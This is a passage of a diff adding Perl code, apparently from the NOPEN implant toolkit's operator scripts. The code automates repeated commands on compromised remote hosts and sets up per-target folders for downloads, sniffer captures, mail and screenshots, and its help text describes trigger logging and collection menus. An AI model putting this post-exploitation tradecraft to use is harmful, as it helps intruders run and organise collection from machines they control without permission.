+      mydie("BAD SPECIAL config.\n\n".
+	    "Cannot use REPEAT: YES with -exit, \\-burnBURN or any infinitely run command.");
+    }
+    progprint($COLOR_FAILURE.
+	      "\n\nSHIFTING into SPECIAL mode $dowhat:\n$COLOR_NORMAL\n".
+	      "cd $dodir ; ls -al $doname\n".
+	      `cd $dodir ; ls -al $doname`.
+	      "\n$doname\n=============\n".
+	      $content
+	     );
+  REPEATALL:
+    foreach my $cmdnum (sort by_num keys %doitcommands) {
+      my $repeatcount = $doitcount{$cmdnum};
+      my $args = $mydoargs{$cmdnum};
+      my (@cmdargs) = split(/\s/,$args);
+      while ($repeatcount and $repeatcount--) {
+	$repeatcount = -1 if ($repeatcount < 0);
+	dbg(" inside: mydoargs{$cmdnum}=$mydoargs{$cmdnum}= repeatcount=$repeatcount=");
+	if (my ($mydocmd) = $doitcommands{$cmdnum} =~ /mydo.([^,]+),/) {
+	  mydo($mydocmd,@cmdargs);
+	} elsif ($doitcommands{$cmdnum} =~ /^nopenlss/) {
+	  nopenlss(@cmdargs);
+	} else {
+	  doit($doitcommands{$cmdnum});
+	}
+      }
+      #      doit("w");
+    }
+    $repeatall = -1 if ($repeatall < 0);
+    
+    dbg("REPEATALL or not: repeatall=$repeatall= cmdcount=".scalar(keys %doitcommands)."=");
+
+    if ($repeatall-- and keys %doitcommands > 0) {
+      if ($sleepbetween) {
+	my $sleepcount = 0;
+	while($sleepcount++ < $sleepbetween) {
+	  sleep 1;
+#	  dbg("Looking for $stopfile for $sleepcount".
+#	      `ls -al $stopfile`);
+	  if ($stopfile and -f $stopfile) {
+	    goto DROPOUT;
+	  }
+	}
+      }
+      goto REPEATALL unless $repeatall == 0; # last one we skip to get numbers right
+    }
+
+  DROPOUT:
+    if ($stopfile and -f $stopfile) {
+      # TODO: Consider unlink($stopfile); here
+      progprint("STOPFILE: $stopfile exists, stopping now.");
+    }
+    doit($doitlast[0]) if (@doitlast);
+  }
+  if (-s $gsfile and -s $autofile) {
+    my @ARGS=();
+    if (-s "$gsfile.args") {
+      if (open(SPECIALIN,"$gsfile.args")) {
+	while (<SPECIALIN>) {
+	  chomp;
+	  next if /^\s*\#/;
+	  push(@ARGS,$_);
+	}
+      }
+    }
+    mydo($autofile,@ARGS);
+    return;
+  } elsif (! -s $dofile) {
+    return;
+  }
+
+}#dospecial
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog ($ENV{$GSOPTIONS} called -gs runonce @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }  
+    require $autoutils;
+    $prog = "-gs runonce";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+  $local_ip = "" ;
+  foreach $int (ppp0,ppp1,eth0,eth1) {
+    chomp($ip=`ifconfig $int 2>/dev/null | grepip | egrep -v "255|127\.0" | head -1`) ;
+    last if $ip ;
+  }
+  $local_ip=$ip ;
+  $gsoptions = $ENV{GSOPTIONS} ;
+
+  # Some things to do exactly once this op per host
+  `mkdir -p $opdown/$nopen_rhostname 2> /dev/null`
+    unless ((-d "$opdown/$nopen_rhostname") or ($nopen_rhostname =~ /(^localhost\.localdomain\.127.*|.*127\.0\.0\.1$)/));
+  `mkdir -p $opsniff 2>/dev/null` unless (-d "$opsniff");
+  `mkdir -p $opmail/notours 2>/dev/null` unless (-d "$opmail/notours");
+  `mkdir -p $opmail/nogood 2>/dev/null` unless (-d "$opmail/nogood");
+  `mkdir -p $optargetcommands 2>/dev/null` unless (-d  $optargetcommands);
+  `mkdir -p $opscreencaps 2>/dev/null` unless (-d  $opscreencaps); 
+  `mkdir -p $opdown/ROUTER/$nopen_rhostname 2>/dev/null`
+    if ($gbl_routerhost{$nopen_myip} and 
+        !(-d "$opdown/ROUTER/$nopen_rhostname"));
+
+  foreach my $arg (@ARGV) {
+      $dohelp = $arg if ($arg =~ /(HELP|-h)/i);
+      $nopenlssreget = "r"
+	  if ($arg =~ /reget/i);
+      push(@autoargv,$arg)
+	  if ($arg =~ /new/i);
+      $showmenu = $arg
+	  if ($arg =~ /menu/i);
+  }
+
+  $showmenu = "@ARGV" eq "menu";
+  if ($dohelp) {
+    progprint
+      ("$COLOR_NORMAL\n".
+       "Usage: autorunonce is called automatically by NOPEN.\n\n".
+       "Every new NOPEN session performs a -gs auto automatically. The content\n".
+       "of, and in particular the comments in, the following files may also prove\n".
+       "useful:\n".
+       "               ./etc/norc*\n".
+       "               ./etc/gs.auto\n".
+       "               ./etc/autorunonce\n".
+       #	      "               ./etc/\n".
+       "\n".
+       "The -gs auto starts a chain of events:\n\n".
+       #"  o   ./etc/nopennamefix is called. This adjusts the NOPEN_RHOSTNAME\n".
+       #"      variable in case the remote hostname includes whitespace or special\n".
+       #"      characters. It is also what creates each NOPEN host's sniffer and\n".
+       #"      history directories.\n".
+       "  o   ./etc/autocheck is called, and, if it exits without error, then\n".
+       "      autorunonce is then called. autocheck is no longer needed (autodone\n".
+       "      used to use it), but it need not be removed here.\n".
+       "\n".
+       "autorunonce then performs several functions:\n\n".
+       #"  o   local_firewall(\$nopen_autoport), which adds a local iptables\n".
+       #"      rule to ensure no remote hosts can connect to this NOPEN window's\n".
+       #"      command and control port.\n".
+       "  o   autoscriptcheck ensures this NOPEN window is run within a scripted\n".
+       "      window, and recommends you immediately -exit if it is not.\n".
+       "  o   autosessioninit, which is responsible for printing the didthis-style\n".
+       "      listing of all currently active NOPEN sessions and initializing the\n".
+       "      NOPEN session by reading and executing any target-specific norc files.\n".
+       "  o   logtrigger then logs this target's most recent successful ourtn/-irtun\n".
+       "      trigger, if any, prompting you for which one is accurate if more than\n".
+       "      one trigger is found.\n".
+       "  o   dorunonce calls the familiar interactive autonewdone menu asking if you\n".
+       "      are ready to proceed with the autonewdone commands.\n".
+       "  o   dospecial is called. If the proper environment variable and/or files\n".
+       "      exist, it automatically starts a target specific task, or several such\n".
+       "      tasks, each in its own NOPEN window. (See -gs dospecial -h for more.)\n".
+       "  o   \n".
+       "\n".
+       "To redo autonewdone, use or combine these options after \"-gs auto\"\n".
+       "(case insensitive):\n\n".
+       "      -f or FORCE      (skips the menu, starts immediately, no repeat -gets)\n".
+       "            REGET      (repeats autonewdone, including any -gets)\n".
+       "            SHORT      (repeats shorter version of autonewdone)\n".
+       "\n$prog $VER"
+      );
+    exit;
+  }
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless ($socket or $dohelp);
+  ($autoforce,$autoyes,$autoreget,$autoshort,$autonohostinfo) = ();
+  ($redo,$thismonth,$today,$thismonthfiles,$todayfiles) = whendo("autonewdone");
+  $nopenlssreget = "r" if $autoreget;
+
+#offerabort("in autorunonce, whendo(autonewdone) returned:
+#(\$redo,\$thismonth,\$today,\$thismonthfiles,\$todayfiles)
+#  ($redo,$thismonth,$today,$thismonthfiles,$todayfiles)
+
+#");
+
+  unlink("$optmp/autonewdone.$nopen_rhostname")
+    if ($autoforce);
+
+}#myinit
+
